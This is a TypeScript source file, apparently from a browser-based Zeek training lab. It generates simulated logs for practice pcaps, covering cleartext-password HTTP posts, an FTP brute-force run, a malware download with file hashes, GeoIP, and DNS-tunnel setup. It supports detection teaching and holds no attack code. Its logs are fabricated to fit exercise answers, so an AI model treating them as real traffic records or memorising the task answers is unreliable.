// "Hasil analisis" Zeek untuk setiap pcap latihan. Zeek asli tidak berjalan di browser,
// jadi tiap pcap punya log tiruan yang disusun supaya cocok dengan soal di materi.

import type { FileKind } from '../vfs'
import {
  type Cell, type Conn, type Notice, type SigHit,
  rng, uid, int, pick, shuffle, memo, zlog, ts, connLog, connRow, noticeLog, signaturesLog, sigNotice,
  packetFilterLog, dnsRow, dhcpRow, DNS_FIELDS, DNS_TYPES, DHCP_FIELDS, DHCP_TYPES, CONN_FIELDS, CONN_TYPES,
} from './gen'

export interface RunOut {
  files: Record<string, string>
  dirs?: Record<string, Record<string, { content: string; kind: FileKind }>>
  stdout: string[]
  notices?: Notice[]
}

export interface Scenario {
  conns: () => Conn[]
  /** fx = efek script yang dimuat, sigs = nama berkas signature yang dipakai. */
  run: (fx: Set<string>, sigs: Set<string>) => RunOut
}

const HTTP_FIELDS =
  'ts uid id.orig_h id.orig_p id.resp_h id.resp_p trans_depth method host uri referrer version user_agent origin request_body_len response_body_len status_code status_msg info_code info_msg tags username password proxied orig_fuids orig_filenames orig_mime_types resp_fuids resp_filenames resp_mime_types'
const HTTP_TYPES =
  'time string addr port addr port count string string string string string string string count count count string count string set[enum] string string set[string] vector[string] vector[string] vector[string] vector[string] vector[string] vector[string]'

interface Http {
  ts: number; uid: string; oh: string; op: number; rh: string; rp?: number
  method: string; host: string; uri: string; ua?: string; reqLen?: number; respLen?: number
  status: number; msg: string; respFuid?: string; respMime?: string
}

const httpLog = (rows: Http[]) =>
  zlog('http', HTTP_FIELDS, HTTP_TYPES, rows.map((h) => [
    ts(h.ts), h.uid, h.oh, h.op, h.rh, h.rp ?? 80, 1, h.method, h.host, h.uri, '-', '1.1',
    h.ua ?? 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0', '-',
    h.reqLen ?? 0, h.respLen ?? 0, h.status, h.msg, '-', '-', '(empty)', '-', '-', '-', '-', '-', '-',
    h.respFuid ?? '-', '-', h.respMime ?? '-',
  ]))

const FILES_FIELDS =
  'ts fuid tx_hosts rx_hosts conn_uids source depth analyzers mime_type filename duration local_orig is_orig seen_bytes total_bytes missing_bytes overflow_bytes timedout parent_fuid md5 sha1 sha256 extracted extracted_cutoff extracted_size'
const FILES_TYPES =
  'time string set[addr] set[addr] set[string] string count set[string] string string interval bool bool count count count count bool string string string string string bool count'

// ======================================================================
// sample.pcap — dipakai TASK-2, TASK-3, dan TASK-7/101
// ======================================================================

const SERVICES: [string, string, number][] = [
  ['dns', 'udp', 53], ['ntp', 'udp', 123], ['ssh', 'tcp', 22], ['snmp', 'udp', 161],
  ['syslog', 'udp', 514], ['dhcp', 'udp', 67], ['-', 'udp', 1967],
]

const sampleConns = memo(() => {
  const r = rng(7)
  const out: Conn[] = []
  let t = 1488571051.94325
  for (let i = 0; i < 87; i++) {
    const [service, proto, rp] = i === 0 ? SERVICES[0] : pick(r, SERVICES)
    let dur: string
    if (i === 0) dur = '0.001263'
    else if (i === 40) dur = '332.319364'
    else if (r() < 0.12) dur = '-'
    else dur = (r() < 0.5 ? r() * 12 : r() * 330).toFixed(6)
    const idle = dur === '-'
    out.push({
      ts: t, uid: i === 0 ? 'CTMFXm1AcIsSnq2Ric' : uid(r),
      oh: i === 0 ? '192.168.121.2' : `192.168.121.${pick(r, [2, 10, 20, 40])}`, op: i === 0 ? 51153 : int(r, 1025, 65000),
      rh: i === 0 ? '192.168.120.22' : `192.168.120.${pick(r, [1, 10, 22])}`, rp,
      proto, service, dur,
      ob: idle ? '-' : int(r, 30, 900), rb: idle ? '-' : int(r, 40, 4000),
      state: idle ? 'S0' : 'SF', hist: proto === 'tcp' ? (idle ? 'S' : 'ShAdDaFf') : idle ? 'D' : 'Dd',
      opk: int(r, 1, 12), rpk: idle ? 0 : int(r, 1, 12),
    })
    t += r() * 4
  }
  return out
})

const sampleLogs = memo(() => {
  const r = rng(8)
  const t0 = 1488571051.94325
  const open = '2022-03-15-07-18-51'
  const dns: Cell[][] = []
  for (let i = 0; i < 14; i++) {
    const q = i % 3 === 1 ? 'ip.webernetz.net' : 'blog.webernetz.net'
    dns.push(dnsRow(r, t0 + i * 6.3, '192.168.121.2', '192.168.120.22', q, q.startsWith('ip') ? '5.35.226.136' : '80.154.108.235'))
  }
  const idp = (n: number, rh: string, rp: number) => [ts(t0 + n), uid(r), `192.168.121.${pick(r, [2, 10, 40])}`, int(r, 1025, 65000), rh, rp]
  return {
    'conn.log': connLog(sampleConns(), open),
    'dns.log': zlog('dns', DNS_FIELDS, DNS_TYPES, dns, open),
    'dhcp.log': zlog('dhcp', DHCP_FIELDS, DHCP_TYPES, [dhcpRow(r, t0 + 12.2, '192.168.121.40', '192.168.121.1', 'Microknoppix', 'webernetz.net')], open),
    'ntp.log': zlog(
      'ntp',
      'ts uid id.orig_h id.orig_p id.resp_h id.resp_p version mode stratum poll precision root_delay root_disp ref_id num_exts',
      'time string addr port addr port count count count interval interval interval interval string count',
      [3, 19, 44, 71].map((n) => [...idp(n, '212.224.120.164', 123), 4, 3, 3, '64.000000', '0.000000', '0.031250', '0.046875', '131.188.3.221', 0]),
      open,
    ),
    'snmp.log': zlog(
      'snmp',
      'ts uid id.orig_h id.orig_p id.resp_h id.resp_p duration version community get_requests get_bulk_requests get_responses set_requests display_string up_since',
      'time string addr port addr port interval string string count count count count string time',
      [5, 27, 63].map((n) => [...idp(n, '192.168.120.1', 161), (r() * 2).toFixed(6), '2c', 'public', int(r, 1, 9), 0, int(r, 1, 9), 0, '-', '-']),
      open,
    ),
    'ssh.log': zlog(
      'ssh',
      'ts uid id.orig_h id.orig_p id.resp_h id.resp_p version auth_success auth_attempts direction client server cipher_alg mac_alg compression_alg kex_alg host_key_alg host_key',
      'time string addr port addr port count bool count enum string string string string string string string string',
      [9, 52].map((n) => [...idp(n, '192.168.120.10', 22), 2, 'T', 1, '-', 'SSH-2.0-OpenSSH_7.2p2', 'SSH-2.0-OpenSSH_6.6.1p1', 'chacha20-poly1305@openssh.com', 'umac-64-etm@openssh.com', 'none', 'curve25519-sha256@libssh.org', 'ssh-ed25519', '6f:9a:1e:55:0c:d2:71:33:8b:aa:40:17:c9:e2:5d:08']),
      open,
    ),
    'syslog.log': zlog(
      'syslog',
      'ts uid id.orig_h id.orig_p id.resp_h id.resp_p proto facility severity message',
      'time string addr port addr port enum string string string',
      [14, 38, 77].map((n) => [...idp(n, '192.168.120.10', 514), 'udp', 'LOCAL7', 'NOTICE', 'fw1: session closed by peer']),
      open,
    ),
    'packet_filter.log': packetFilterLog(t0, open),
  }
})

const sample: Scenario = {
  conns: sampleConns,
  run: () => ({ files: { ...sampleLogs() }, stdout: [] }),
}

// ======================================================================
// http.pcap — dipakai TASK-5/http dan TASK-9/cleartext-pass
// ======================================================================

const HTTP_SRC = '10.10.57.178'
const HTTP_DST = '44.228.249.3'
const POST_BANNER =
  'POST /userinfo.php HTTP/1.1\\x0d\\x0aHost: testphp.vulnweb.com\\x0d\\x0aUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/...'

const httpConns = memo((): Conn[] => {
  const mk = (t: number, u: string, op: number, service: string, dur: string, ob: number, rb: number, hist: string, opk: number, rpk: number): Conn => ({
    ts: t, uid: u, oh: HTTP_SRC, op, rh: HTTP_DST, rp: 80, proto: 'tcp', service, dur, ob, rb, state: 'SF', hist, opk, rpk,
  })
  return [
    mk(1647504658.846581, 'CfePb82kTlQNsQZgh1', 38704, '-', '5.239036', 0, 0, 'ShAFf', 4, 2),
    mk(1647504684.179199, 'Cz9L3j2rNElZsh7a8b', 38706, 'http', '0.635811', 1271, 4159, 'ShADadFRfR', 11, 9),
    mk(1647504690.412771, 'CHq2Xw4b0YlBmTzN5e', 38708, '-', '5.118402', 0, 0, 'ShAFf', 4, 2),
    mk(1647504701.006154, 'CkP8sR3aVdJ1uGmW7c', 38710, '-', '5.094311', 0, 0, 'ShAFf', 4, 2),
    mk(1647504712.557903, 'CvT6yL9oEfK2nQxA4d', 38712, 'http', '0.412087', 642, 2910, 'ShADadFf', 6, 5),
  ]
})

const httpScenario: Scenario = {
  conns: httpConns,
  run: (fx, sigs) => {
    const c = httpConns()
    const posts = [c[1], c[4]]
    const files: Record<string, string> = {
      'conn.log': connLog(c),
      'http.log': httpLog(posts.map((p, i) => ({
        ts: p.ts + 0.2, uid: p.uid, oh: p.oh, op: p.op, rh: p.rh, method: 'POST', host: 'testphp.vulnweb.com', uri: '/userinfo.php',
        reqLen: 38, respLen: i === 0 ? 3975 : 2760, status: 200, msg: 'OK', respFuid: i === 0 ? 'FbN4Jk2PqR7sTuVw1x' : 'FyZ3Ab6CdE9fGhIj5k', respMime: 'text/html',
      }))),
      'files.log': zlog('files', FILES_FIELDS, FILES_TYPES, posts.map((p, i) => [
        ts(p.ts + 0.3), i === 0 ? 'FbN4Jk2PqR7sTuVw1x' : 'FyZ3Ab6CdE9fGhIj5k', HTTP_DST, HTTP_SRC, p.uid, 'HTTP', 0, '(empty)', 'text/html', '-',
        '0.000112', '-', 'F', i === 0 ? 3975 : 2760, '-', 0, 0, 'F', '-', '-', '-', '-', '-', '-', '-',
      ])),
      'packet_filter.log': packetFilterLog(c[0].ts),
    }
    const notices: Notice[] = []
    if (sigs.has('http-password.sig')) {
      const hits: SigHit[] = posts.map((p) => ({
        ts: p.ts + 0.21, uid: p.uid, src: HTTP_SRC, sport: p.op, dst: HTTP_DST, dport: 80,
        sig: 'http-password', msg: `${HTTP_SRC}: Cleartext Password Found!`, sub: POST_BANNER,
      }))
      files['signatures.log'] = signaturesLog(hits)
      notices.push(...hits.map(sigNotice))
    }
    if (fx.has('sniffpass')) {
      const seen: [Conn, string][] = [[c[1], 'BroZeek'], [c[4], 'ZeekBro'], [c[4], 'BroZeek']]
      notices.push(...seen.map(([p, user], i) => ({
        ts: p.ts + 0.22 + i * 0.01, uid: p.uid, oh: p.oh, op: p.op, rh: p.rh, rp: 80, proto: 'tcp',
        note: 'SNIFFPASS::HTTP_POST_Password_Seen', msg: `Password found for user ${user}`, src: p.oh, dst: p.rh, p: 80,
      })))
    }
    return { files, stdout: [], notices }
  },
}

// ======================================================================
// ftp.pcap — dipakai TASK-5/ftp dan TASK-7/201
// ======================================================================

const FTP_SRC = '10.234.125.254'
const FTP_DST = '10.121.70.151'

interface FtpTry { conn: Conn; user: string; ok: boolean }

const ftpTries = memo((): FtpTry[] => {
  const r = rng(21)
  const users = [
    ...Array<string>(670).fill('admin'),
    ...Array<string>(731).fill('administrator'),
    'anonymous', 'anonymous', 'anonymous', 'ftp', 'root', 'test', 'guest', 'user', 'oracle', 'backup', 'www', 'support',
  ]
  shuffle(r, users)
  let t = 1024380731.21089
  return users.map((user, i) => {
    const ok = user === 'anonymous'
    const conn: Conn = {
      ts: t, uid: uid(r), oh: FTP_SRC, op: 2200 + i, rh: FTP_DST, rp: 21, proto: 'tcp', service: 'ftp',
      dur: (0.02 + r() * 0.4).toFixed(6), ob: int(r, 30, 60), rb: int(r, 90, 160), state: 'SF', hist: 'ShAdDaFf', opk: int(r, 6, 9), rpk: int(r, 5, 8),
    }
    t += 0.01 + r() * 0.05
    return { conn, user, ok }
  })
})

const FTP_LOG_FIELDS =
  'ts uid id.orig_h id.orig_p id.resp_h id.resp_p user password command arg mime_type file_size reply_code reply_msg data_channel.passive data_channel.orig_h data_channel.resp_h data_channel.resp_p fuid'
const FTP_LOG_TYPES =
  'time string addr port addr port string string string string string count count string bool addr addr port string'

const ftpLog = (tries: FtpTry[]) =>
  zlog('ftp', FTP_LOG_FIELDS, FTP_LOG_TYPES, tries.map(({ conn: c, user, ok }) => [
    ts(c.ts + 0.01), c.uid, c.oh, c.op, c.rh, c.rp, user, '<hidden>', 'PASS', '-', '-', '-', ok ? 230 : 530, ok ? 'Login successful.' : 'Login incorrect.', '-', '-', '-', '-', '-',
  ]))

const ftpScenario: Scenario = {
  conns: () => ftpTries().map((t) => t.conn),
  run: (fx, sigs) => {
    const tries = ftpTries()
    const files: Record<string, string> = {
      'conn.log': connLog(tries.map((t) => t.conn)),
      'ftp.log': ftpLog(tries),
      'packet_filter.log': packetFilterLog(tries[0].conn.ts),
    }
    const hits: SigHit[] = []
    for (const { conn: c, user, ok } of tries) {
      const base = { uid: c.uid, sport: c.op, dport: 21 }
      if (sigs.has('ftp-admin.sig') && user.startsWith('admin')) {
        hits.push({ ...base, ts: c.ts + 0.004, src: FTP_SRC, dst: FTP_DST, sig: 'ftp-admin', msg: `${FTP_SRC}: FTP Admin Login Attempt!`, sub: `USER ${user}` })
      }
      if (sigs.has('ftp-bruteforce.sig')) {
        hits.push({ ...base, ts: c.ts + 0.005, src: FTP_SRC, dst: FTP_DST, sig: 'ftp-username', msg: `${FTP_SRC}: FTP Username Input Found!`, sub: `USER ${user}` })
        if (!ok) {
          hits.push({ uid: c.uid, ts: c.ts + 0.012, src: FTP_DST, sport: 21, dst: FTP_SRC, dport: c.op, sig: 'ftp-brute', msg: `${FTP_DST}: FTP Brute-force Attempt!`, sub: '530 Login incorrect.' })
        }
      }
    }
    const notices: Notice[] = hits.map(sigNotice)
    if (hits.length) files['signatures.log'] = signaturesLog(hits)
    const stdout: string[] = []
    if (fx.has('201')) {
      for (const h of hits) if (h.sig === 'ftp-admin') stdout.push('Signature hit! --> #FTP-Admin')
    }
    if (fx.has('bruteforce')) {
      notices.push({ ts: 1024380732.223481, note: 'FTP::Bruteforcing', msg: `${FTP_SRC} had 20 failed logins on 1 FTP server in 0m1s`, src: FTP_SRC })
    }
    return { files, stdout, notices }
  },
}

// ======================================================================
// ftp-brute.pcap — TASK-7/202
// ======================================================================

const bruteTries = memo((): FtpTry[] => {
  const r = rng(33)
  const out: FtpTry[] = []
  const add = (src: string, dst: string, t0: number, n: number, gap: number) => {
    for (let i = 0; i < n; i++) {
      out.push({
        user: pick(r, ['admin', 'root', 'ftpuser', 'test']), ok: false,
        conn: { ts: t0 + i * gap, uid: uid(r), oh: src, op: int(r, 1025, 65000), rh: dst, rp: 21, proto: 'tcp', service: 'ftp', dur: (0.02 + r() * 0.3).toFixed(6), ob: int(r, 30, 60), rb: int(r, 90, 160), state: 'SF', hist: 'ShAdDaFf', opk: 7, rpk: 6 },
      })
    }
  }
  add(FTP_SRC, FTP_DST, 1024380731.21089, 24, 0.045)
  add('192.168.56.1', '192.168.56.101', 1389721047.3, 26, 1.48)
  return out
})

const ftpBrute: Scenario = {
  conns: () => bruteTries().map((t) => t.conn),
  run: (fx) => {
    const tries = bruteTries()
    const notices: Notice[] = []
    if (fx.has('bruteforce')) {
      notices.push(
        { ts: 1024380732.223481, note: 'FTP::Bruteforcing', msg: `${FTP_SRC} had 20 failed logins on 1 FTP server in 0m1s`, src: FTP_SRC },
        { ts: 1389721084.522861, note: 'FTP::Bruteforcing', msg: '192.168.56.1 had 20 failed logins on 1 FTP server in 0m37s', src: '192.168.56.1' },
      )
    }
    return {
      files: { 'conn.log': connLog(tries.map((t) => t.conn)), 'ftp.log': ftpLog(tries), 'packet_filter.log': packetFilterLog(tries[0].conn.ts) },
      stdout: [], notices,
    }
  },
}

// ======================================================================
// smallFlows.pcap & bigFlows.pcap — TASK-6
// ======================================================================

function flowConns(seed: number, n: number, net: string, t0: number): Conn[] {
  const r = rng(seed)
  const out: Conn[] = []
  let t = t0
  for (let i = 0; i < n; i++) {
    const [service, proto, rp] = pick(r, [['dns', 'udp', 53], ['http', 'tcp', 80], ['ssl', 'tcp', 443], ['dhcp', 'udp', 67], ['-', 'tcp', 445]] as [string, string, number][])
    out.push({
      ts: t, uid: uid(r), oh: `${net}.${int(r, 2, 220)}`, op: int(r, 1025, 65000),
      rh: service === 'dns' || service === 'dhcp' ? `${net}.1` : `${int(r, 13, 216)}.${int(r, 1, 250)}.${int(r, 1, 250)}.${int(r, 1, 250)}`, rp,
      proto, service, dur: (r() * 30).toFixed(6), ob: int(r, 40, 5000), rb: int(r, 60, 90000), state: 'SF', hist: proto === 'tcp' ? 'ShADadFf' : 'Dd', opk: int(r, 1, 40), rpk: int(r, 1, 60),
    })
    t += r() * 2
  }
  return out
}

const smallConns = memo(() => flowConns(41, 64, '192.168.3', 1295981542.7))
const smallFlows: Scenario = {
  conns: smallConns,
  run: (fx) => {
    const r = rng(42)
    const t0 = 1295981542.7
    const hosts: [string, string, string][] = [['student01-PC', '192.168.3.131', '-'], ['vinlap01', '10.0.2.15', 'astaro_vineyard']]
    const qs = ['www.google.com', 'www.facebook.com', 'ajax.googleapis.com', 'www.linkedin.com', 'mail.google.com', 'profile.ak.fbcdn.net']
    return {
      files: {
        'conn.log': connLog(smallConns()),
        'dhcp.log': zlog('dhcp', DHCP_FIELDS, DHCP_TYPES, hosts.map(([h, ip, dom], i) => dhcpRow(r, t0 + 3 + i * 40, ip, ip.replace(/\d+$/, '1'), h, dom))),
        'dns.log': zlog('dns', DNS_FIELDS, DNS_TYPES, Array.from({ length: 22 }, (_, i) => dnsRow(r, t0 + i * 7, '192.168.3.131', '192.168.3.1', pick(r, qs), '74.125.19.104'))),
        'packet_filter.log': packetFilterLog(t0),
      },
      stdout: fx.has('dhcphost') ? hosts.map((h) => h[0]) : [],
    }
  },
}

const BIG_HOSTS = [
  'JDT91', 'm30-sqdesk', 'JDT100', 'JDT096', 'JDT094', 'JDT134', 'JDT120', 'JLT108', 'JDT107', 'JDT80',
  'JDT087', 'JDT79', 'HP0D0B20', 'JDT115', 'JLT103', 'JDT168', 'JDT133',
]
const WORDS = [
  'alpine', 'beacon', 'cobalt', 'delta', 'ember', 'falcon', 'garnet', 'harbor', 'indigo', 'jasper', 'kestrel', 'lumen',
  'meridian', 'nimbus', 'onyx', 'pioneer', 'quartz', 'raven', 'summit', 'tundra', 'umber', 'vertex', 'willow', 'xenon',
  'yonder', 'zephyr', 'atlas', 'borealis', 'cinder', 'drift', 'echo', 'fathom', 'glacier', 'horizon', 'isle',
]
const TLDS = ['com', 'net', 'org', 'io']
const SUBS = ['www', 'mail', 'cdn', 'api', 'static', 'img', 'login', 'update']

const bigConns = memo(() => flowConns(51, 320, '172.16.133', 1361916156.6))
const bigLogs = memo(() => {
  const r = rng(52)
  const t0 = 1361916156.6
  // 1109 nama domain unik, tanpa tanda hubung maupun bintang.
  const names: string[] = []
  for (let i = 0; i < 1109; i++) {
    const d = Math.floor(i / SUBS.length)
    names.push(`${SUBS[i % SUBS.length]}.${WORDS[d % WORDS.length]}.${TLDS[Math.floor(d / WORDS.length)]}`)
  }
  const queries = [...names]
  for (let i = 0; i < 1500; i++) queries.push(pick(r, names))
  for (let i = 0; i < 40; i++) queries.push('-')
  for (let i = 0; i < 15; i++) queries.push('*')
  shuffle(r, queries)
  const dns = queries.map((q, i) => dnsRow(r, t0 + i * 0.11, `172.16.133.${int(r, 2, 220)}`, '172.16.128.202', q, q === '-' || q === '*' ? '-' : `96.43.${int(r, 1, 250)}.${int(r, 1, 250)}`))
  const hosts = [...BIG_HOSTS]
  for (let i = 0; i < 46; i++) hosts.push(pick(r, BIG_HOSTS))
  shuffle(r, hosts)
  const dhcp = hosts.map((h, i) => dhcpRow(r, t0 + i * 4.6, `172.16.133.${20 + BIG_HOSTS.indexOf(h)}`, '172.16.128.202', h, 'jaalam.net'))
  return { hosts, dns: zlog('dns', DNS_FIELDS, DNS_TYPES, dns), dhcp: zlog('dhcp', DHCP_FIELDS, DHCP_TYPES, dhcp) }
})

const bigFlows: Scenario = {
  conns: bigConns,
  run: (fx) => {
    const logs = bigLogs()
    return {
      files: { 'conn.log': connLog(bigConns()), 'dhcp.log': logs.dhcp, 'dns.log': logs.dns, 'packet_filter.log': packetFilterLog(1361916156.6) },
      stdout: fx.has('dhcphost') ? logs.hosts : [],
    }
  },
}

// ======================================================================
// case1.pcap — TASK-8
// ======================================================================

const VICTIM = '10.6.27.102'
const CASE1_FILES = [
  { ts: 1561667874.743959, fuid: 'Fpgan59p6uvNzLFja', uid: 'CaeNgL1QzYGxxZPwpk', tx: '23.63.254.163', op: 49158, analyzers: 'SHA1,MD5', mime: 'text/plain', dur: '0.000000', size: 14,
    md5: 'cd5a4d3fdd5bffc16bf959ef75cf37bc', sha1: '33bf88d5b82df3723d5863c7d23445e345828904', sha256: '6137f8db2192e638e13610f75e73b9247c05f4706f0afd1fdb132d86de6b4012',
    host: 'www.msftncsi.com', uri: '/ncsi.txt', kind: 'text' as FileKind, content: 'Microsoft NCSI' },
  { ts: 1561667889.703239, fuid: 'FB5o2Hcauv7vpQ8y3', uid: 'CCwdoX1SU0fF3BGBCe', tx: '107.180.50.162', op: 49159, analyzers: 'SHA1,MD5', mime: 'application/msword', dur: '4.386569', size: 323072,
    md5: 'b5243ec1df7d1d5304189e7db2744128', sha1: 'a66bd2557016377dfb95a87c21180e52b23d2e4e', sha256: 'f808229aa516ba134889f81cd699b8d246d46d796b55e13bee87435889a054fb',
    host: 'smart-fax.com', uri: '/Documents/Invoice&MSO-Request.doc', kind: 'doc' as FileKind, content: '' },
  { ts: 1561667899.060086, fuid: 'FOghls3WpIjKpvXaEl', uid: 'CZruIO2cqspVhLuAO9', tx: '107.180.50.162', op: 49162, analyzers: 'PE,SHA1,MD5', mime: 'application/x-dosexec', dur: '0.498764', size: 2437120,
    md5: 'cc28e40b46237ab6d5282199ef78c464', sha1: '0d5c820002cf93384016bd4a2628dcc5101211f4', sha256: '749e161661290e8a2d190b1a66469744127bc25bf46e5d0c6f2e835f4b92db18',
    host: 'smart-fax.com', uri: '/knr.exe', kind: 'exe' as FileKind, content: '' },
]

const case1Conns = memo((): Conn[] => {
  const r = rng(61)
  const fileConns: Conn[] = CASE1_FILES.map((f) => ({
    ts: f.ts - 0.2, uid: f.uid, oh: VICTIM, op: f.op, rh: f.tx, rp: 80, proto: 'tcp', service: 'http',
    dur: (Number(f.dur) + 0.3).toFixed(6), ob: 310, rb: f.size, state: 'SF', hist: 'ShADadFf', opk: int(r, 6, 400), rpk: int(r, 6, 1700),
  }))
  const dns: Conn[] = [1561667872.1, 1561667888.9, 1561667898.4].map((t) => ({
    ts: t, uid: uid(r), oh: VICTIM, op: int(r, 49000, 65000), rh: '10.6.27.1', rp: 53, proto: 'udp', service: 'dns',
    dur: (r() * 0.2).toFixed(6), ob: 34, rb: 68, state: 'SF', hist: 'Dd', opk: 1, rpk: 1,
  }))
  return [...dns, ...fileConns].sort((a, b) => a.ts - b.ts)
})

const case1: Scenario = {
  conns: case1Conns,
  run: (fx) => {
    const r = rng(62)
    const extractName = (f: (typeof CASE1_FILES)[number]) => `extract-${ts(f.ts)}-HTTP-${f.fuid}`
    const hash = fx.has('hash')
    const extract = fx.has('extract')
    const files: Record<string, string> = {
      'conn.log': connLog(case1Conns()),
      'dhcp.log': zlog('dhcp', DHCP_FIELDS, DHCP_TYPES, [dhcpRow(r, 1561667871.2, VICTIM, '10.6.27.1', 'DESKTOP-B8TQK49', 'smart-fax.local')]),
      'dns.log': zlog('dns', DNS_FIELDS, DNS_TYPES, [
        dnsRow(r, 1561667872.1, VICTIM, '10.6.27.1', 'www.msftncsi.com', '23.63.254.163'),
        dnsRow(r, 1561667888.9, VICTIM, '10.6.27.1', 'smart-fax.com', '107.180.50.162'),
        dnsRow(r, 1561667898.4, VICTIM, '10.6.27.1', 'smart-fax.com', '107.180.50.162'),
      ]),
      'http.log': httpLog(CASE1_FILES.map((f) => ({
        ts: f.ts - 0.1, uid: f.uid, oh: VICTIM, op: f.op, rh: f.tx, method: 'GET', host: f.host, uri: f.uri,
        ua: f.kind === 'text' ? 'Microsoft NCSI' : 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0)',
        respLen: f.size, status: 200, msg: 'OK', respFuid: f.fuid, respMime: f.mime,
      }))),
      'files.log': zlog('files', FILES_FIELDS, FILES_TYPES, CASE1_FILES.map((f) => [
        ts(f.ts), f.fuid, f.tx, VICTIM, f.uid, 'HTTP', 0,
        [...(extract ? ['EXTRACT'] : []), ...f.analyzers.split(',').filter((a) => hash || a === 'PE')].join(',') || '(empty)',
        f.mime, '-', f.dur, '-', 'F', f.size, f.size, 0, 0, 'F', '-',
        hash ? f.md5 : '-', hash ? f.sha1 : '-', hash ? f.sha256 : '-', extract ? extractName(f) : '-', extract ? 'F' : '-', '-',
      ])),
      'pe.log': zlog(
        'pe',
        'ts id machine compile_ts os subsystem is_exe is_64bit uses_aslr uses_dep uses_code_integrity uses_seh has_import_table has_export_table has_cert_table has_debug_data section_names',
        'time string string time string string bool bool bool bool bool bool bool bool bool bool vector[string]',
        [[ts(CASE1_FILES[2].ts), CASE1_FILES[2].fuid, 'I386', '1561647621.000000', 'Windows XP', 'WINDOWS_GUI', 'T', 'F', 'T', 'T', 'F', 'T', 'T', 'F', 'F', 'F', '.text,.rdata,.data,.rsrc,.reloc']],
      ),
      'packet_filter.log': packetFilterLog(1561667871.2),
    }
    if (fx.has('intel')) {
      files['intel.log'] = zlog(
        'intel',
        'ts uid id.orig_h id.orig_p id.resp_h id.resp_p seen.indicator seen.indicator_type seen.where seen.node matched sources fuid file_mime_type file_desc',
        'time string addr port addr port string enum enum string set[enum] set[string] string string string',
        [
          [ts(1561667888.9), 'CZ1jLe2nHENdGQX377', VICTIM, 53770, '10.6.27.1', 53, 'smart-fax.com', 'Intel::DOMAIN', 'DNS::IN_REQUEST', 'zeek', 'Intel::DOMAIN', 'zeek-intel-test', '-', '-', '-'],
          [ts(1561667889.6), 'C044Ot1OxBt8qCk7f2', VICTIM, 49159, '107.180.50.162', 80, 'smart-fax.com', 'Intel::DOMAIN', 'HTTP::IN_HOST_HEADER', 'zeek', 'Intel::DOMAIN', 'zeek-intel-test', '-', '-', '-'],
        ],
      )
    }
    const out: RunOut = { files, stdout: [] }
    if (extract) {
      out.dirs = { extract_files: Object.fromEntries(CASE1_FILES.map((f) => [extractName(f), { content: f.content, kind: f.kind }])) }
    }
    return out
  },
}

// ======================================================================
// case2.pcap — TASK-9/geoip-conn
// ======================================================================

const CASE2_HTTP: [string, number, number][] = [
  ['116.203.71.114', 301, 4], ['116.203.71.114', 200, 26], ['116.203.71.114', 302, 4], ['116.203.71.114', 404, 6], ['23.77.86.54', 301, 4],
]
const STATUS_MSG: Record<number, string> = { 200: 'OK', 301: 'Moved Permanently', 302: 'Found', 404: 'Not Found' }
const GEO: Record<string, string[]> = {
  '23.77.86.54': ['US', 'IL', 'Chicago', '41.850000', '-87.650000'],
  '173.0.82.206': ['US', '-', '-', '37.751000', '-97.822000'],
  '173.0.82.211': ['US', '-', '-', '37.751000', '-97.822000'],
  '23.2.46.147': ['US', '-', '-', '37.751000', '-97.822000'],
  '116.203.71.114': ['DE', '-', '-', '51.299300', '9.491000'],
}
const NO_GEO = ['-', '-', '-', '-', '-']

const case2Data = memo(() => {
  const r = rng(71)
  const client = '10.6.29.101'
  const rows: { conn: Conn; status?: number }[] = []
  for (const [host, status, n] of CASE2_HTTP) {
    for (let i = 0; i < n; i++) {
      rows.push({
        status,
        conn: { ts: 0, uid: uid(r), oh: client, op: int(r, 49200, 65000), rh: host, rp: 80, proto: 'tcp', service: 'http', dur: (r() * 3).toFixed(6), ob: int(r, 200, 600), rb: int(r, 300, 40000), state: 'SF', hist: 'ShADadFf', opk: int(r, 5, 30), rpk: int(r, 5, 40) },
      })
    }
  }
  const other = (rh: string, rp: number, proto: string, service: string, n: number) => {
    for (let i = 0; i < n; i++) {
      rows.push({ conn: { ts: 0, uid: uid(r), oh: client, op: int(r, 49200, 65000), rh, rp, proto, service, dur: (r() * 2).toFixed(6), ob: int(r, 40, 900), rb: int(r, 80, 6000), state: 'SF', hist: proto === 'tcp' ? 'ShADadFf' : 'Dd', opk: int(r, 1, 20), rpk: int(r, 1, 20) } })
    }
  }
  other('10.6.29.1', 53, 'udp', 'dns', 7)
  other('173.0.82.206', 443, 'tcp', 'ssl', 2)
  other('173.0.82.211', 443, 'tcp', 'ssl', 2)
  other('23.2.46.147', 443, 'tcp', 'ssl', 2)
  shuffle(r, rows)
  let t = 1571849012.31
  for (const row of rows) {
    row.conn.ts = t
    t += 0.2 + r() * 3
  }
  return rows
})

const case2: Scenario = {
  conns: () => case2Data().map((d) => d.conn),
  run: (fx) => {
    const data = case2Data()
    const conns = data.map((d) => d.conn)
    const geoFields = ['orig', 'resp'].flatMap((s) => ['country_code', 'region', 'city', 'latitude', 'longitude'].map((f) => `geo.${s}.${f}`)).join(' ')
    const files: Record<string, string> = {
      'conn.log': fx.has('geoip')
        ? zlog('conn', `${CONN_FIELDS} ${geoFields}`, `${CONN_TYPES} string string string double double string string string double double`, conns.map((c) => [...connRow(c), ...NO_GEO, ...(GEO[c.rh] ?? NO_GEO)]))
        : connLog(conns),
      'http.log': httpLog(data.filter((d) => d.status).map((d) => ({
        ts: d.conn.ts + 0.05, uid: d.conn.uid, oh: d.conn.oh, op: d.conn.op, rh: d.conn.rh, method: 'GET',
        host: d.conn.rh === '23.77.86.54' ? 'acroipm.adobe.com' : 'hetzner-mirror.example', uri: d.status === 404 ? '/favicon.ico' : '/', status: d.status!, msg: STATUS_MSG[d.status!],
      }))),
      'packet_filter.log': packetFilterLog(conns[0].ts),
    }
    const stdout: string[] = []
    if (fx.has('sumstats')) {
      for (const host of ['116.203.71.114', '23.77.86.54']) {
        stdout.push(`Host: ${host}`)
        for (const [h, status, n] of CASE2_HTTP) if (h === host) stdout.push(`status code: ${status}, count: ${n}`)
      }
    }
    return { files, stdout }
  },
}

// ======================================================================
// dns-tunneling.pcap — modul Latihan Zeek, kasus Anomalous DNS
// ======================================================================

const TUNNEL_SRC = '10.20.57.3'
const TUNNEL_DNS = '10.10.2.21'
